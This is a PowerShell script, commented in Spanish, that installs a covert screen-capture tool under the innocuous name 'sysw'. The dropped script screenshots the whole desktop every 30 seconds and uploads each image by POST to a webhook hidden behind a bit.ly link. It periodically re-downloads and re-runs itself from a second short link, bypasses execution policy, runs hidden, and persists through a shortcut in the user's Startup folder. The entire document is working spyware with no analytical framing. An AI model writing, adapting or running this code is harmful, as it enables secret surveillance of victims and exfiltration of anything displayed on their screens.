# Verificar si el script ya está en ejecución
if (-not (Get-Process -Name sysw -ErrorAction SilentlyContinue)) {
    # Contenido del script principal (sysw.ps1)
    $scriptContent = @"
    # Contenido del script principal (sysw.ps1)
    \$hookurl = "https://bit.ly/chu_kbras"
    \$seconds = 30 # Intervalo entre capturas
    \$a = 1 # Cantidad de capturas
    \$maxImages = 10 # Cantidad máxima de imágenes antes de verificar y descargar el script nuevamente

    # Detección de URL acortada
    if (\$hookurl.Length -ne 121) {
        Write-Host "Shortened Webhook URL Detected!!!."
        \$hookurl = (Invoke-RestMethod -Uri \$hookurl).url
    }

    do {
        \$Filett = "\$env:temp\SC.png"
        Add-Type -AssemblyName System.Windows.Forms
        Add-type -AssemblyName System.Drawing
        \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        \$Width = \$Screen.Width
        \$Height = \$Screen.Height
        \$Left = \$Screen.Left
        \$Top = \$Screen.Top
        \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
        \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
        \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
        \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
        Start-Sleep 1
        Invoke-WebRequest -Uri \$hookurl -Method POST -InFile \$Filett
        Start-Sleep 1
        Remove-Item -Path \$Filett
        Start-Sleep \$seconds

        # Verificar si se ha alcanzado la cantidad máxima de imágenes
        if (\$a -ge \$maxImages) {
            # Verificar si el script está presente y descargarlo si es necesario
            if (-not (Test-Path \$env:USERPROFILE\sysw.ps1)) {
                (New-Object System.Net.WebClient).DownloadFile("https://bit.ly/Screen_dc", "\$env:USERPROFILE\sysw.ps1")
            }
            # Ejecutar el script descargado
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File \$env:USERPROFILE\sysw.ps1" -WindowStyle Hidden

            # Reiniciar contador de imágenes
            \$a = 1
        } else {
            \$a++
        }
    } while (\$true)
    "@

    # Ruta para guardar el script principal
    $output = "$env:USERPROFILE\sysw.ps1"

    # Guardar el contenido del script principal en un archivo
    Set-Content -Path $output -Value $scriptContent

    # Creación de acceso directo en la carpeta de inicio del usuario
    $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($shortcutLocation)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$output`""
    $shortcut.Save()

    # Ejecución del script principal
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$output`"" -WindowStyle Hidden
}
